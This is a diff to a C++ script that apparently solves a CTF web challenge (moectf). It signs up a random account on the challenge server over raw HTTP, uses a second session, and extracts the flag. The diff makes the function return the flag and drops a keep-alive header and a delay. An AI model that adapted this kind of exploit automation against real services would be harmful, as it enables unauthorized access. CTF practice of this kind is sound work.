@@ -14,16 +14,14 @@ string randstr() {
 	return ret;
 }
 
-int HK_main() {
-	string uname = randstr();
+string HK_main() {
+	string uname = randstr(), flag;
 	string pwd = "asdfasdf";
 	RemoteSession registerer = remote("devops-5.moectf.misaka.ch", 80);
 	RemoteSession dae = remote("devops-5.moectf.misaka.ch", 80);
 	POSTRequest *reg = new POSTRequest("devops-5.moectf.misaka.ch", "/?act=signup", "uname=" + uname + "&psw=" + pwd + "&psw-repeat=" + pwd);
-	reg->table["Connection"] = "keep-alive";
 	//cout << reg->toString();
 	registerer.send(reg->toString());
-	Sleep(10);
 	//cout << registerer.recv();
 
 
@@ -44,7 +42,7 @@ int HK_main() {
 	else {
 		temp = temp.substr(temp.find("moectf"));
 		temp = temp.substr(0, temp.find("}") + 1);
-		cout << "flag got!:" << temp;
+		flag = temp;
 	}
-	return 0;
+	return flag;
 }
